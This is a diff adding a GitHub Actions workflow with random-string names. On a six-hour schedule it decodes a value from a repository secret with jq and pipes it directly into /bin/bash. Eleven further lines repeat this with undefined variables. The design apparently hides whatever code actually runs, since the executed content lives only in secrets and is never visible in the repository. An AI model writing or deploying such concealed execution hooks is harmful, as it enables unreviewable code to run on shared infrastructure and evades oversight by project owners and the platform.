@@ -1,0 +1,29 @@
+name: hmhaomai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hmhaomai
+        env:
+          jv9798: ${{ secrets.jv9798 }}
+        run: |
+          echo $jv9798 | jq -r .tpw9884 | /bin/bash
+          echo $ctw38 | jq -r .iu5590 | /bin/bash
+          echo $uvp015 | jq -r .dwse44320 | /bin/bash
+          echo $h95821 | jq -r .z678 | /bin/bash
+          echo $nzjh4056 | jq -r .fgw040 | /bin/bash
+          echo $gfog7545 | jq -r .qrbk6 | /bin/bash
+          echo $hwwxh796 | jq -r .tx7 | /bin/bash
+          echo $nun764 | jq -r .jx489 | /bin/bash
+          echo $fzhs03464 | jq -r .x865 | /bin/bash
+          echo $n290 | jq -r .xf2924 | /bin/bash
+          echo $pbydg5501 | jq -r .p18270 | /bin/bash
+          echo $fnnk10 | jq -r .vdh9643 | /bin/bash
+
